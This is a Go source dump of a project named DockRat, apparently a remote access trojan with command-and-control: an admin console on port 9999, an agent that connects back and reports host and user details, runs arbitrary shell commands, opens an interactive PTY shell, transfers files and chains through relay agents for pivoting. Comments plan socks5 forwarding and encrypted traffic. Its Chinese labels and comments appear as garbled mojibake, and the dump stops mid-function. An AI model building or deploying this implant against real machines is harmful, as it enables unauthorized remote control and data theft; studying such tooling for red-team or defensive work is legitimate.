å­æ–‡ä»¶å¤¹ï¼š./cmd
å­æ–‡ä»¶å¤¹ï¼š./cmd/admin
æ–‡ä»¶ï¼š./cmd/admin/main.go
å†…å®¹ï¼š


package main

import (
	"log"

	"github.com/Singert/DockRat/core/network"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/node"
)

var registry = node.NewRegistry()

func main() {
	log.Println("[+] Admin starting...")

	// å¯åŠ¨æ§åˆ¶å°å‘½ä»¤å¤„ç†
	go protocol.StartConsole(registry)

	// å¯åŠ¨ç›‘å¬å¹¶å¤„ç† Agent è¿æ¥
	network.StartListener(":9999", registry)
}


/*
å“åº”æ¶ˆæ¯ï¼ˆå¦‚ MsgResponseï¼‰ç¼“å­˜èµ·æ¥ï¼Œä»¥ä¾¿åœ¨æ§åˆ¶å°ä¸­è¾“å‡ºæœ€è¿‘ä¸€æ¡å“åº”ï¼Ÿ
ä½ ä¹Ÿå¯ä»¥å°† MsgShell è¾“å‡ºå®šå‘åˆ°å¸¦é¢œè‰²æˆ–å¸¦æç¤ºçš„ç»ˆç«¯ UIï¼Œåç»­æ”¯æŒé€€å‡ºã€ä¸Šä¼ ç­‰å‘½ä»¤æ‰©å±•ã€‚
å¦‚éœ€è¿›ä¸€æ­¥æ”¯æŒ shell ä¼šè¯ä¿æŒã€çª—å£è°ƒæ•´ã€æˆ– stdout ç¼“å­˜ï¼Œ
*/

å­æ–‡ä»¶å¤¹ï¼š./cmd/agent
æ–‡ä»¶ï¼š./cmd/agent/main.go
å†…å®¹ï¼š
package main

import (
	"encoding/json"
	"log"
	"net"
	"os"
	"runtime"

	"github.com/Singert/DockRat/core/network"
	"github.com/Singert/DockRat/core/protocol"
)

type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	SelfID   int    `json:"self_id"`   // å½“å‰ agent çš„ ID
	ParentID int    `json:"parent_id"` // åˆå§‹ä¸º -1ï¼Œè¡¨ç¤ºæ²¡æœ‰çˆ¶èŠ‚ç‚¹
}

func main() {
	adminAddr := "127.0.0.1:9999"
	conn, err := net.Dial("tcp", adminAddr)
	if err != nil {
		log.Fatalf("[-] Failed to connect to admin: %v", err)
	}
	log.Println("[+] Connected to admin!")

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := HandshakePayload{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		ParentID: -1, //åˆå§‹ä¸º -1ï¼Œè¡¨ç¤ºæ²¡æœ‰çˆ¶èŠ‚ç‚¹
	}
	payloadBytes, _ := json.Marshal(payload)

	msg := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: payloadBytes,
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Fatalf("[-] Failed to encode message: %v", err)
	}

	_, err = conn.Write(data)
	if err != nil {
		log.Fatalf("[-] Failed to send message: %v", err)
	}

	log.Println("[+] Handshake message sent")

	network.StartAgent(&network.AgentContext{
		SelfID:     1,
		Conn:       conn,
		ParentConn: nil, // é¡¶çº§ agentï¼Œæ— ä¸Šå±‚
	})
}

/*æ˜¯å¦ç»§ç»­å®ç°ï¼š

    ğŸš æŒä¹…åŒ– shell æ¨¡å¼ï¼ˆäº¤äº’å¼ stdin/stdoutï¼‰

    ğŸ›°ï¸ socks5 è½¬å‘æˆ–ç«¯å£æ˜ å°„

    ğŸ” TLS/AES åŠ å¯†é€šä¿¡å±‚

ä½ å¯ä»¥æŒ‡å®šæƒ³ä¼˜å…ˆå¼€å‘çš„å­æ¨¡å—ã€‚ */

å­æ–‡ä»¶å¤¹ï¼š./core
å­æ–‡ä»¶å¤¹ï¼š./core/common
æ–‡ä»¶ï¼š./core/common/config.go
å†…å®¹ï¼š
package common
æ–‡ä»¶ï¼š./core/common/logger.go
å†…å®¹ï¼š
package common

å­æ–‡ä»¶å¤¹ï¼š./core/crypto
æ–‡ä»¶ï¼š./core/crypto/cipher.go
å†…å®¹ï¼š
package crypto
å­æ–‡ä»¶å¤¹ï¼š./core/network
æ–‡ä»¶ï¼š./core/network/connection.go
å†…å®¹ï¼š
package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/utils"
)

type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	ParentID int    `json:"parent_id"` // åˆå§‹ä¸º -1ï¼Œè¡¨ç¤ºæ²¡æœ‰çˆ¶èŠ‚ç‚¹
}

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := utils.BytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
			ParentID: payload.ParentID,
		}
		id := registry.Add(n)

		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			fmt.Print(string(msg.Payload))
		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}

æ–‡ä»¶ï¼š./core/network/dispatcher.go
å†…å®¹ï¼š
package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/utils"
	"github.com/creack/pty"
)

// å°è£…æ¯ä¸ª agent å®ä¾‹ä¸Šä¸‹æ–‡
type AgentContext struct {
	SelfID     int
	Conn       net.Conn
	ParentConn net.Conn
}

var shellStarted = false
var shellStdin io.WriteCloser

var currentUploadFile *os.File

var childConnMap = make(map[int]net.Conn)
var childConnMu sync.Mutex

// ç”¨äºå»¶è¿Ÿç»‘å®šè¿æ¥
var pendingConns []net.Conn
var pendingMu sync.Mutex

func StartAgent(ctx *AgentContext) {
	conn := ctx.Conn
	selfID := ctx.SelfID
	parent := ctx.ParentConn

	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Connection closed or failed: %v", err)
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Failed to read message body: %v", err)
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode error: %v", err)
			continue
		}

		if msg.ToNodeID != 0 {
			relayToChild(msg)
			continue
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, selfID, parent)
		case protocol.MsgShell:
			if msg.FromNodeID == 0 {
				handleShellPTY(msg, conn, selfID, parent)
			} else {
				if parent != nil {
					relayUpward(msg, parent)
				} else {
					conn.Write(data)
				}
			}
		case protocol.MsgResponse:
			if parent != nil {
				relayUpward(msg, parent)
			} else {
				encoded, _ := protocol.EncodeMessage(msg)
				conn.Write(encoded)
			}
		case protocol.MsgUploadInit:
			handleUploadInit(msg)
		case protocol.MsgUploadChunk:
			handleUploadChunk(msg)
		case protocol.MsgUploadDone:
			handleUploadDone()
		case protocol.MsgDownloadInit:
			handleDownloadInit(msg, conn)
		case protocol.MsgListen:
			handleListenCommand(msg, ctx)
		case protocol.MsgConnect:
			handleConnectCommand(msg)
		case protocol.MsgBindRelayConn:
			handleBindRelayConn(msg)
		default:
			log.Println("[-] Unknown message type:", msg.Type)
		}
	}
}

func relayToChild(msg protocol.Message) {
	childConnMu.Lock()
	conn, ok := childConnMap[msg.ToNodeID]
	childConnMu.Unlock()

	if !ok {
		log.Printf("[-] No child with ID %d found for relay\n", msg.ToNodeID)
		return
	}

	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Println("[-] Relay encode error:", err)
		return
	}
	conn.Write(data)
}

func handleCommand(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{
		Type:       protocol.MsgResponse,
		Payload:    output,
		FromNodeID: selfID,
	}
	data, _ := protocol.EncodeMessage(resp)
	conn.Write(data)
}

func handleShellPTY(msg protocol.Message, conn net.Conn, selfID int, parent net.Conn) {
	line := string(msg.Payload)

	if !shellStarted {
		cmd := exec.Command("/bin/sh")
		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		shellStarted = true
		shellStdin = ptmx

		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Println("[-] Shell read error:", err)
					return
				}
				msg := protocol.Message{
					Type:       protocol.MsgShell,
					Payload:    buf[:n],
					FromNodeID: selfID,
				}
				data, err := protocol.EncodeMessage(msg)
				if err != nil {
					log.Println("[-] Shell encode error:", err)
					return
				}
				conn.Write(data)
			}
		}()
		return
	}

	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	shellStdin.Write([]byte(line))
}

func handleUploadInit(msg protocol.Message) {
	var payload protocol.UploadInitPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] UploadInit decode error:", err)
		return
	}

	file, err := os.Create(payload.Filename)
	if err != nil {
		log.Println("[-] Failed to create upload file:", err)
		return
	}

	currentUploadFile = file
	log.Printf("[+] Start receiving file: %s (%d bytes)", payload.Filename, payload.Filesize)
}

func handleUploadChunk(msg protocol.Message) {
	if currentUploadFile == nil {
		log.Println("[-] Received chunk with no open file")
		return
	}

	var chunk protocol.UploadChunkPayload
	if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
		log.Println("[-] Upload chunk decode error:", err)
		return
	}
	_, err := currentUploadFile.Write(chunk.Data)
	if err != nil {
		log.Println("[-] Write chunk failed:", err)
	}
}

func handleUploadDone() {
	if currentUploadFile != nil {
		currentUploadFile.Close()
		currentUploadFile = nil
		log.Println("[+] Upload complete")
	} else {
		log.Println("[-] Upload done received with no open file")
	}
}

func handleDownloadInit(msg protocol.Message, conn net.Conn) {
	var payload protocol.DownloadInitPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] DownloadInit decode error:", err)
		return
	}

	file, err := os.Open(payload.Filename)
	if err != nil {
		log.Println("[-] Cannot open file for download:", err)
		return
	}
	defer file.Close()

	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			chunk := protocol.DownloadChunkPayload{Data: buf[:n]}
			data, _ := json.Marshal(chunk)
			msg := protocol.Message{Type: protocol.MsgDownloadChunk, Payload: data}
			packet, _ := protocol.EncodeMessage(msg)
			conn.Write(packet)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Println("[-] File read error:", err)
			return
		}
	}
	done := protocol.Message{Type: protocol.MsgDownloadDone, Payload: []byte("done")}
	pkt, _ := protocol.EncodeMessage(done)
	conn.Write(pkt)
	log.Println("[+] File download finished")
}

func handleListenCommand(msg protocol.Message, ctx *AgentContext) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Listen command decode failed:", err)
		return
	}
	port := payload["port"]
	go func() {
		ln, err := net.Listen("tcp", ":"+port)
		if err != nil {
			log.Println("[-] Agent listen failed:", err)
			return
		}
		log.Println("[+] Agent listening on port", port)
		for {
			conn, err := ln.Accept()
			if err != nil {
				log.Println("[-] Accept failed:", err)
				continue
			}
			go handleChildConn(conn, ctx.Conn) // ä¿æŒä¸å˜ï¼ŒparentConn ä¼šåœ¨ handleChildConn ä¸­ä¼ å…¥
		}
	}()
}

func handleConnectCommand(msg protocol.Message) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Connect command decode failed:", err)
		return
	}
	target := payload["target"]
	parentIDStr := payload["parent_id"] // å½“å‰èŠ‚ç‚¹çš„ IDï¼Œå°†ä½œä¸º child çš„ parent
	parentID, _ := strconv.Atoi(parentIDStr)
	conn, err := net.Dial("tcp", target)
	if err != nil {
		log.Println("[-] Failed to connect target:", err)
		return
	}
	log.Println("[+] Connected to parent agent", target)

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	// æ³¨æ„ï¼šè¿™ä¸ª parent_id ä¼šè¢«å¯¹æ–¹å½“ä½œ selfID ä½¿ç”¨
	payloadData := map[string]interface{}{
		"hostname": hostname,
		"username": username,
		"os":       runtime.GOOS,
		"relay_id": parentID,
	}
	data, _ := json.Marshal(payloadData)
	msgToSend := protocol.Message{
		Type:    protocol.MsgHandshake,
		Payload: data,
	}
	packet, _ := protocol.EncodeMessage(msgToSend)
	conn.Write(packet)

	// å°† conn ä½œä¸ºå­èŠ‚ç‚¹çš„è¿æ¥ï¼Œè‡ªå·±æ˜¯ parentï¼ˆnilï¼‰â†’ è¢«è¿æ¥ç«¯æ¥å¤„ç† StartAgent
	// ä¸è°ƒç”¨ StartAgent(conn)ï¼StartAgent åº”åœ¨ handleChildConn ä¸­ç”±ä¸Šçº§æ‰§è¡Œ
}

func handleChildConn(conn net.Conn, parentConn net.Conn) {
	log.Println("[+] Received child connection from", conn.RemoteAddr())

	// è¯»å– 4 å­—èŠ‚é•¿åº¦å‰ç¼€
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[-] Failed to read handshake length:", err)
		conn.Close()
		return
	}
	length := utils.BytesToUint32(lengthBuf)

	// è¯»å–æ¶ˆæ¯å†…å®¹
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[-] Failed to read handshake data:", err)
		conn.Close()
		return
	}

	// è§£ç  handshake æ¶ˆæ¯
	msg, err := protocol.DecodeMessage(data)
	if err != nil || msg.Type != protocol.MsgHandshake {
		log.Println("[-] Invalid handshake from child")
		conn.Close()
		return
	}
	// æå– relay_idï¼ˆè¡¨ç¤º admin åˆ†é…çš„æœ€ç»ˆ nodeIDï¼‰
	var payload map[string]interface{}
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Failed to parse handshake payload:", err)
		conn.Close()
		return
	}
	idFloat, ok := payload["relay_id"].(float64)
	if !ok {
		log.Println("[-] Missing relay_id in handshake")
		conn.Close()
		return
	}
	relayID := int(idFloat)

	// å°†è¿æ¥å­˜å…¥ pendingConnsï¼Œç­‰å¾…ç»‘å®šæŒ‡ä»¤
	pendingMu.Lock()
	pendingConns = append(pendingConns, conn)
	pendingMu.Unlock()
	log.Println("[+] Child handshake received, storing connection as pending")

	// å¯åŠ¨è¯¥è¿æ¥çš„å‘½ä»¤å¤„ç†å¾ªç¯ï¼ˆSelfID æš‚æœªçŸ¥ï¼‰
	go StartAgent(&AgentContext{
		SelfID:     -2, // çœŸå® ID å°šæœªåˆ†é…
		Conn:       conn,
		ParentConn: parentConn,
	})
	// é€šçŸ¥ admin æˆ–ä¸Šçº§ relayï¼šâ€œæˆ‘æœ‰ä¸€ä¸ªè¿æ¥ï¼Œç›®æ ‡æ˜¯ relayIDï¼Œè¯·ç»‘å®šæˆ‘â€
	bindPayload := protocol.BindRelayConnPayload{ID: relayID}
	bindData, _ := json.Marshal(bindPayload)
	bindMsg := protocol.Message{
		Type:    protocol.MsgBindRelayConn,
		Payload: bindData,
	}
	buf, _ := protocol.EncodeMessage(bindMsg)
	_, err = parentConn.Write(buf)
	if err != nil {
		log.Printf("[-] Failed to send BindRelayConn to parent: %v\n", err)
	} else {
		log.Printf("[*] Sent BindRelayConn to parent for ID %d\n", relayID)
	}

}

func relayUpward(msg protocol.Message, parent net.Conn) {
	data, err := protocol.EncodeMessage(msg)
	if err != nil {
		log.Println("[-] Relay upward encode error:", err)
		return
	}
	_, err = parent.Write(data)
	if err != nil {
		log.Println("[-] Relay upward write failed:", err)
	}
}

func handleBindRelayConn(msg protocol.Message) {
	var payload protocol.BindRelayConnPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] BindRelayConn decode error:", err)
		return
	}

	pendingMu.Lock()
	defer pendingMu.Unlock()

	if len(pendingConns) == 0 {
		log.Println("[-] No pending conn to bind")
		return
	}

	conn := pendingConns[0]
	pendingConns = pendingConns[1:]

	childConnMu.Lock()
	childConnMap[payload.ID] = conn
	childConnMu.Unlock()

	log.Printf("[+] Bound pending connection as node ID %d\n", payload.ID)
}

æ–‡ä»¶ï¼š./core/network/packet.go
å†…å®¹ï¼š
package network
å­æ–‡ä»¶å¤¹ï¼š./core/node
æ–‡ä»¶ï¼š./core/node/registry.go
å†…å®¹ï¼š
package node

import (
	"fmt"
	"net"
	"sync"
)

type Node struct {
	ID       int
	ParentID int
	Conn     net.Conn
	Hostname string
	Username string
	OS       string
	Addr     string
}

type Registry struct {
	nodes  map[int]*Node
	mu     sync.Mutex
	nextID int
}

func NewRegistry() *Registry {
	return &Registry{
		nodes: make(map[int]*Node),
	}
}

func (r *Registry) Add(node *Node) int {
	r.mu.Lock()
	defer r.mu.Unlock()

	id := r.nextID
	node.ID = id
	r.nodes[id] = node
	r.nextID++
	return id
}

func (r *Registry) List() []*Node {
	r.mu.Lock()
	defer r.mu.Unlock()

	nodes := make([]*Node, 0, len(r.nodes))
	for _, node := range r.nodes {
		nodes = append(nodes, node)
	}
	return nodes
}

func (r *Registry) Get(id int) (*Node, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	node, ok := r.nodes[id]
	return node, ok
}

func (r *Registry) Remove(id int) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.nodes, id)
}

func (r *Registry) GetChildren(parentID int) []*Node {
	r.mu.Lock()
	defer r.mu.Unlock()

	children := []*Node{}
	for _, node := range r.nodes {
		if node.ParentID == parentID {
			children = append(children, node)
		}
	}
	return children
}

func (n *Node) String() string {
	return fmt.Sprintf("Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s",
		n.ID, n.Addr, n.Hostname, n.Username, n.OS)
}

/*
ç°åœ¨ä½ çš„ NodeRegistry å·²å…·å¤‡å®Œæ•´çš„å¢ã€åˆ ã€æŸ¥ã€åˆ—èƒ½åŠ›ï¼Œä¸‹ä¸€æ­¥ä½ å¯ä»¥è½»æ¾æ”¯æŒï¼š

    æ§åˆ¶æŒ‡å®šèŠ‚ç‚¹ï¼šé€šè¿‡ registry.Get(id) å‘é€å‘½ä»¤

    å®ç°è‡ªåŠ¨æ–­çº¿å‰”é™¤ï¼šé€šè¿‡ Remove(id) æ¸…é™¤ç¦»çº¿èŠ‚ç‚¹
*/

æ–‡ä»¶ï¼š./core/node/topology.go
å†…å®¹ï¼š
package node
å­æ–‡ä»¶å¤¹ï¼š./core/protocol
æ–‡ä»¶ï¼š./core/protocol/command.go
å†…å®¹ï¼š
package protocol

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/utils"
)

var downloadChan = make(chan []byte, 100)

var currentNodeID = -1

func StartConsole(registry *node.Registry) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("(admin) >> ")
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		tokens := strings.SplitN(input, " ", 2)
		cmd := tokens[0]
		arg := ""
		if len(tokens) > 1 {
			arg = tokens[1]
		}

		switch cmd {
		case "detail":
			handleDetail(registry)
		case "exec":
			handleExec(arg, registry)
		case "shell":
			handleShell(arg, registry)
		case "upload":
			handleUpload(arg, registry)
		case "download":
			handleDownload(arg, registry)
		case "listen":
			handleListen(arg, registry)
		case "connect":
			handleConnect(arg, registry)
		case "use":
			handleUse(arg, registry)
		case "topo":
			handleTopo(registry)
		case "whoami":
			fmt.Printf("[*] Current node ID: %d\n", currentNodeID)
		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func handleDetail(reg *node.Registry) {
	nodes := reg.List()
	fmt.Println("[+] Connected nodes:")
	for _, n := range nodes {
		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s, ParentID: %d\n",
			n.ID, n.Addr, n.Hostname, n.Username, n.OS, n.ParentID)
	}
}

func handleExec(arg string, reg *node.Registry) {
	if currentNodeID == -1 {
		fmt.Println("[-] No node selected. Use `use <id>` first.")
		return
	}
	n, ok := reg.Get(currentNodeID)
	if !ok {
		fmt.Println("[-] Node not found")
		return
	}

	cmdPayload := map[string]string{"cmd": arg}
	data, _ := json.Marshal(cmdPayload)
	msg := Message{
		Type:     MsgCommand,
		Payload:  data,
		ToNodeID: currentNodeID,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Encode failed:", err)
		return
	}
	_, err = n.Conn.Write(buf)
	if err != nil {
		fmt.Println("[-] Send failed:", err)
		return
	}
}

func handleShell(_ string, reg *node.Registry) {
	if currentNodeID == -1 {
		fmt.Println("[-] No node selected. Use `use <id>` first.")
		return
	}
	n, ok := reg.Get(currentNodeID)
	if !ok {
		fmt.Println("[-] Node not found")
		return
	}

	msg := Message{
		Type:     MsgShell,
		Payload:  []byte("start shell"),
		ToNodeID: currentNodeID,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Encode failed:", err)
		return
	}
	_, err = n.Conn.Write(buf)
	if err != nil {
		fmt.Println("[-] Send failed:", err)
		return
	}

	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
	inputScanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("remote$ ")
		if !inputScanner.Scan() {
			break
		}
		line := inputScanner.Text()
		if strings.TrimSpace(line) == "exit" {
			fmt.Println("[*] Exiting shell mode.")
			break
		}
		cmdMsg := Message{
			Type:     MsgShell,
			Payload:  []byte(line + "\n"),
			ToNodeID: currentNodeID,
		}
		buf, err := EncodeMessage(cmdMsg)
		if err != nil {
			fmt.Println("[-] Shell encode error:", err)
			break
		}
		_, err = n.Conn.Write(buf)
		if err != nil {
			fmt.Println("[-] Shell write error:", err)
			break
		}
	}
}

func readShellOutput(conn io.Reader) {
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			fmt.Println("[-] Shell read error:", err)
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			fmt.Println("[-] Shell read body error:", err)
			return
		}
		msg, err := DecodeMessage(data)
		if err != nil {
			fmt.Println("[-] Shell decode error:", err)
			return
		}
		if msg.Type == MsgShell {
			fmt.Printf(string(msg.Payload))
		}
	}
}

func handleUpload(arg string, registry *node.Registry) {
	if currentNodeID == -1 {
		fmt.Println("[-] No node selected. Use `use <id>` first.")
		return
	}
	n, ok := registry.Get(currentNodeID)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	parts := strings.SplitN(arg, " ", 2)
	if len(parts) != 2 {
		fmt.Println("[-] Usage: upload <local_file> <remote_file>")
		return
	}

	local := strings.TrimSpace(parts[0])
	remote := strings.TrimSpace(parts[1])

	file, err := os.Open(local)
	if err != nil {
		fmt.Println("[-] Failed to open file:", err)
		return
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println("[-] Failed to get file info:", err)
		return
	}

	initPayload := UploadInitPayload{
		Filename: remote,
		Filesize: fileInfo.Size(),
	}
	payloadBytes, err := json.Marshal(initPayload)
	if err != nil {
		fmt.Println("[-] Failed to marshal init payload:", err)
		return
	}
	msg := Message{
		Type:     MsgUploadInit,
		Payload:  payloadBytes,
		ToNodeID: currentNodeID,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Message encode failed:", err)
		return
	}
	n.Conn.Write(buf)

	reader := bufio.NewReader(file)
	chunkSize := 4096
	bufData := make([]byte, chunkSize)
	for {
		nr, err := reader.Read(bufData)
		if nr > 0 {
			chunk := UploadChunkPayload{
				Data: bufData[:nr]}
			data, _ := json.Marshal(chunk)
			msg := Message{
				Type:     MsgUploadChunk,
				Payload:  data,
				ToNodeID: currentNodeID,
			}
			pkt, _ := EncodeMessage(msg)
			n.Conn.Write(pkt)
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Println("Upload read error:", err)
			return
		}
	}
	done := Message{
		Type:     MsgUploadDone,
		Payload:  []byte("done"),
		ToNodeID: currentNodeID,
	}
	pkt, _ := EncodeMessage(done)
	n.Conn.Write(pkt)
	fmt.Println("[+] Upload completed")
}

func handleDownload(arg string, registry *node.Registry) {
	if currentNodeID == -1 {
		fmt.Println("[-] No node selected. Use `use <id>` first.")
		return
	}
	n, ok := registry.Get(currentNodeID)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	parts := strings.SplitN(arg, " ", 2)
	if len(parts) != 2 {
		fmt.Println("[-] Usage: download <remote_file> <local_file>")
		return
	}

	remote := strings.TrimSpace(parts[0])
	local := strings.TrimSpace(parts[1])

	req := DownloadInitPayload{Filename: remote}
	data, _ := json.Marshal(req)
	msg := Message{Type: MsgDownloadInit, Payload: data, ToNodeID: currentNodeID}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)

	out, err := os.Create(local)
	if err != nil {
		fmt.Println("[-] Create file error:", err)
		return
	}
	defer out.Close()

	for chunk := range downloadChan {
		var payload DownloadChunkPayload
		json.Unmarshal(chunk, &payload)
		out.Write(payload.Data)
	}
	fmt.Println("[+] Download complete")
}

func handleListen(arg string, reg *node.Registry) {
	parts := strings.Split(arg, " ")
	if len(parts) != 2 {
		fmt.Println("[-] Usage: listen <node_id> <port>")
		return
	}
	var nid int
	fmt.Sscanf(parts[0], "%d", &nid)
	port := parts[1]

	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	payload := map[string]string{
		"port": port,
	}
	data, _ := json.Marshal(payload)
	msg := Message{
		Type:    MsgListen,
		Payload: data,
	}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)
	fmt.Println("[+] Listen command sent")
}

func handleConnect(arg string, reg *node.Registry) {
	parts := strings.Split(arg, " ")
	if len(parts) != 3 {
		fmt.Println("[-] Usage: connect <node_id> <ip:port> <parentID>")
		return
	}
	var nid, pid int
	fmt.Sscanf(parts[0], "%d", &nid)
	target := parts[1]
	fmt.Sscanf(parts[2], "%d", &pid)

	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}

	payload := map[string]string{
		"target":    target,
		"parent_id": fmt.Sprintf("%d", pid),
	}
	data, _ := json.Marshal(payload)
	msg := Message{
		Type:    MsgConnect,
		Payload: data,
	}
	buf, _ := EncodeMessage(msg)
	n.Conn.Write(buf)
	fmt.Println("[+] Connect command sent")
	fmt.Printf("[*] Connecting node %d to %s via parent %d\n", nid, target, pid)

}

func handleUse(arg string, reg *node.Registry) {
	var nid int
	fmt.Sscanf(arg, "%d", &nid)
	if _, ok := reg.Get(nid); !ok {
		fmt.Println("[-] No such node")
		return
	}
	currentNodeID = nid
	fmt.Printf("[+] Switched to node %d\n", nid)
}

func handleTopo(reg *node.Registry) {
	var printNode func(id int, depth int)
	printNode = func(id int, depth int) {
		n, ok := reg.Get(id)
		if !ok {
			return
		}
		fmt.Printf("%s[%d] %s@%s\n", strings.Repeat("  ", depth), id, n.Username, n.Hostname)
		for _, child := range reg.GetChildren(id) {
			printNode(child.ID, depth+1)
		}
	}

	fmt.Println("[+] Topology Tree:")
	for _, node := range reg.List() {
